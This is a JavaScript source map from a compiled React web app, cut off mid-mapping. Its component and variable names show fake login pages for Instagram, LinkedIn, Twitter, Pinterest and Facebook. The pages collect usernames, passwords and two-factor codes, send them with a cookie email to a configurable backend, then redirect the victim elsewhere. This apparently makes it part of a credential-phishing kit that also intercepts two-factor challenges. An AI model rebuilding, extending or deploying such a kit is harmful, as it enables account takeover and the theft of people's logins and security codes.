{"version":3,"sources":["images/logo.png","images/instagram-logo.svg","images/linkedin-logo.svg","images/facebook-logo.svg","images/twitter-logo.svg","images/pinterest-logo.svg","components/Header.js","components/Footer.js","components/Home.js","components/Instagram.js","components/Linkedin.js","components/Twitter.js","components/Pinterest.js","components/Facebook.js","App.js","components/History.js","index.js"],"names":["module","exports","env","runtimeEnv","Header","className","Row","Col","undefined","REACT_APP_FAVICONURL","alt","src","logo","Footer","Container","fluid","id","console","log","REACT_APP_URL","window","location","host","Home","state","redirect","to","setRedirect","url","setState","renderRedirect","favicon","document","getElementById","href","title","REACT_APP_TITLE","innerText","Card","Body","this","REACT_APP_INSTAGRAM","class","onClick","instagramLogo","REACT_APP_FACEBOOK","facebookLogo","REACT_APP_PINTEREST","pinterestLogo","REACT_APP_TWITTER","twitterLogo","REACT_APP_LINKEDIN","linkedinLogo","Component","queryString","require","Instagram","username","password","showAlert","loading","message","twoFactor","email_auth","success","code","two_factor_identifier","verificationMethod","appName","hostname","substring","split","handleUsername","event","target","value","handleCode","maxLength","slice","handlePassword","onShowAlert","setTimeout","handleClick","e","preventDefault","length","fetch","method","headers","body","stringify","cookieEmail","REACT_APP_COOKIE_EMAIL","then","response","json","responseData","handleCodeClick","Alert","variant","component","REACT_APP_REDIRECTURL","Form","Group","controlId","Label","Control","type","placeholder","autocomplete","onChange","name","Button","disabled","Spinner","as","animation","size","role","aria-hidden","withText","Linkedin","manualCheck","challangeID","Twitter","challenge_id","challenge_type","enc_user_id","Pinterest","Facebook","App","path","exact","history","ReactDOM","render"],"mappings":"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